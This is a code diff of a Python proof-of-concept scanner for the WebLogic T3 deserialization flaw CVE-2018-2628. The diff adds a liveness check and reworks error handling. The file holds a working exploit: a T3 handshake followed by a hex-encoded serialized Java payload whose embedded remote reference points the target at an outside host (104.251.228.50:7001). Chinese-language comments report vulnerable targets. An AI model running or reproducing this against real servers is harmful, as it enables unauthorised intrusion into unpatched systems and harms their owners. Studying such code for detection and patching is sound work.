@@ -4,12 +4,15 @@
 import socket
 import math
 import time
-import re
+import re,requests
 
 VUL = ['CVE-2018-2628']
 PAYLOAD = [
     'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078']
 VER_SIG = ['\\$Proxy[0-9]+']
+heads = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
+}
 
 
 def t3handshake(sock, server_addr):
@@ -41,13 +44,20 @@ def sendEvilObjData(sock, data):
     time.sleep(2)
     sock.send(bytes.fromhex(payload))
     res = b''
-    try:
-        while True:
+    # try:
+    #     while True:
+    #         res += sock.recv(4096)
+    #         time.sleep(0.1)
+    # except:
+    #     pass
+    # return res
+    while True:
+        try:
             res += sock.recv(4096)
             time.sleep(0.1)
-    except:
-        pass
-    return res
+            return res
+        except:
+            break
 
 
 def checkVul(res, server_addr):
@@ -55,23 +65,41 @@ def checkVul(res, server_addr):
     # print(p)
     if len(p) > 0:
         # print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index])
-        result = '目标weblogic存在JAVA反序列化漏洞,CVE-2018-2628 : %s' % server_addr
+        result = '目标Weblogic存在JAVA反序列化漏洞,CVE-2018-2628 : http://%s' % server_addr
         # print(result)
         return result
+    # else:
+    #     return 'CVE-2018-2628'
+
+
+def islive(ip):
+    r = requests.get(ip, headers=heads, allow_redirects=False, timeout=10, verify=False)
+    return r.status_code
 
 
 def poc(ip):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
-    sock.settimeout(10)
-    rip = ip.split(':')[0]
-    rport = int(ip.split(':')[1])
-    server_addr = (str(rip), rport)
-    t3handshake(sock, server_addr)
-    buildT3RequestObject(sock, rport)
-    for index in PAYLOAD:
-        rs = sendEvilObjData(sock, index)
-        return checkVul(rs, ip)
+    try:
+        if islive(ip) == 200:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
+            # socket.setdefaulttimeout(10)
+            sock.settimeout(15)
+
+            if '://' in str(ip):
+                ip = ip.split('//')[1]
+            rip = ip.split(':')[0]
+            rport = int(ip.split(':')[1])
+            server_addr = (str(rip), rport)
+            try:
+                t3handshake(sock, server_addr)
+                buildT3RequestObject(sock, rport)
+                for index in PAYLOAD:
+                    rs = sendEvilObjData(sock, index)
+                    return checkVul(rs, ip)
+            except:
+                pass
+    except:
+        pass
 
 
 if __name__ == "__main__":
